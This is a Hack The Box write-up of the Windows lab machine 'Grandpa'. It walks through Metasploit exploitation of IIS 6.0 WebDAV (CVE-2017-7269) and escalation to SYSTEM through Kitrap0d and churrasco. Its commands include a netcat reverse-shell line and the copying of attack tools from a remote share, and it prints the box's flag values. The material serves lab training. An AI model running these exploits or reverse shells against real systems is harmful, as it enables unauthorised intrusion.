---
title: "Grandpa - Writeup"
linkTitle: "Grandpa"
weight: 6
featured: true
platform: "HTB"
name: "Grandpa"
os: "Windows"
difficulty: "Easy"
points: 20
release: "12 Apr 2017"
ip: "10.129.70.47"
# Drop a real avatar at static/img/htb/grandpa.png and uncomment:
# avatar: "/img/htb/grandpa.png"
tags: ["windows", "iis6", "webdav", "cve-2017-7269", "metasploit", "ms10-015", "kitrap0d", "churrasco", "seimpersonate", "root-shell"]
description: "Easy Windows box exploiting IIS 6.0 WebDAV (CVE-2017-7269) via Metasploit for an initial NETWORK SERVICE shell, escalated to SYSTEM through MS10-015 (Kitrap0d), with churrasco token impersonation documented as an alternative path."
---

{{< htb name="Grandpa" os="Windows" difficulty="Easy" points="20" release="12 Apr 2017" ip="10.129.70.47" platform="HTB" >}}

## Reconnaissance

```
(root㉿kali)# rustscan -a 10.129.70.47
```

```
Open 10.129.70.47:80
```

```
(root㉿kali)# nmap 10.129.70.47 -p80 -sCV
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0

http-webdav-scan:
  Server Type: Microsoft-IIS/6.0
  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
```

Only port 80 open, running IIS 6.0 with WebDAV enabled. This version/config combination is a known RCE target.

## Enumeration

IIS 6.0 WebDAV is vulnerable to the `ScStoragePathFromUrl` buffer overflow (**CVE-2017-7269**). Metasploit ships a ready module for it, no manual shellcode building needed.

## Initial Foothold

```
(root㉿kali)# msfconsole
msf6 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
msf6 > set rhosts 10.129.70.47
msf6 > set lhost 10.10.15.46
msf6 > exploit
```

```
[*] Started reverse TCP handler on 10.10.15.46:4444
[*] Trying path length 3 to 60 ...
[*] Sending stage (203451 bytes) to 10.129.70.47
[*] Meterpreter session 1 opened (10.10.15.46:4444 -> 10.129.70.47:1030)
```

The module handles the buffer overflow directly, landing a Meterpreter session as `NT AUTHORITY\NETWORK SERVICE`.

## Privilege Escalation

### Method 1: MS10-015 (Kitrap0d)

```
meterpreter > ps
```

```
PID   PPID  Name          User
2292  600   davcdata.exe  NT AUTHORITY\NETWORK SERVICE
2340  2224  rundll32.exe  (no token)
```

The session landed inside `rundll32.exe`, spawned transiently by the web exploit, it carries no visible security token. Local privilege-escalation exploits need a stable process with a valid token to inject into, so migrate first.

```
meterpreter > migrate 2292
```

```
[*] Migrating from 2340 to 2292...
[*] Migration completed successfully.
```

With a stable `NETWORK SERVICE` token in hand, background the session and run the suggester.

```
meterpreter > background
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set session 2
msf6 > exploit
```

```
exploit/windows/local/ms10_015_kitrap0d          Yes  The target appears to be vulnerable
exploit/windows/local/ms14_058_track_popup_menu  Yes
exploit/windows/local/ms14_070_tcpip_ioctl       Yes
exploit/windows/local/ms15_051_client_copy_image Yes
```

Kitrap0d is the most reliable against a build this old. The module and target must share architecture (x86 here).

```
msf6 > use exploit/windows/local/ms10_015_kitrap0d
msf6 > set session 2
msf6 > set lhost 10.10.15.46
msf6 > set lport 4433
msf6 > exploit
```

```
[*] Reflectively injecting payload and triggering the bug...
[*] Launching msiexec to host the DLL...
[*] Sending stage (203451 bytes) to 10.129.70.47
[*] Meterpreter session 3 opened (10.10.15.46:4433 -> 10.129.70.47:1031)
```

```
meterpreter > cat user.txt
```

```
bdff5ec67c3cff017f2bedc146a5d869
```

```
meterpreter > cd ../../Administrator/Desktop
meterpreter > cat root.txt
```

```
9359e905a2c35f861f6a57cecf28bb7b
```

### Method 2: Churrasco (SeImpersonatePrivilege)

An alternative path, useful on hosts where a kernel exploit isn't an option.

```
meterpreter > sysinfo
```

```
Computer        : GRANPA
OS              : Windows Server 2003 (5.2 Build 3790, Service Pack 2).
Architecture    : x86
```

```
meterpreter > shell
C:\> whoami /all
```

```
SeImpersonatePrivilege  Impersonate a client after authentication  Enabled
```

`SeImpersonatePrivilege` enabled on a 2003-era box points to churrasco, the pre-Potato token-impersonation tool for this generation of Windows, rather than a modern Potato variant.

```
C:\wmpub> copy \\10.10.15.46\share\nc.exe .
C:\wmpub> copy \\10.10.15.46\share\churrasco.exe c.exe
C:\wmpub> .\c.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.15.46 443"
```

```
C:\WINDOWS\TEMP> whoami
nt authority\system
```

## Lessons learned

- A local exploit against a web-spawned Meterpreter session can fail silently when the host process is short-lived and carries no visible token (`rundll32.exe` here). If a local exploit fails for no obvious reason, migrate to a stable service process with a visible token (`davcdata.exe`, `NETWORK SERVICE`) before retrying.
- `local_exploit_suggester` is only as reliable as the session it runs against; migrating first changes which modules actually succeed, not just which ones get listed as potentially vulnerable.
- Match architecture between the exploit module and the target explicitly (x86 here), a mismatch is a common silent failure cause on old Windows builds.
- When `SeImpersonatePrivilege` shows up on Windows Server 2003/XP-era hosts, reach for churrasco rather than a modern Potato exploit, those target newer Windows token-handling behavior.
- Two independent privilege-escalation paths existing on the same box, a kernel exploit and a token-impersonation tool, is common on older machines, worth trying both to know your options.
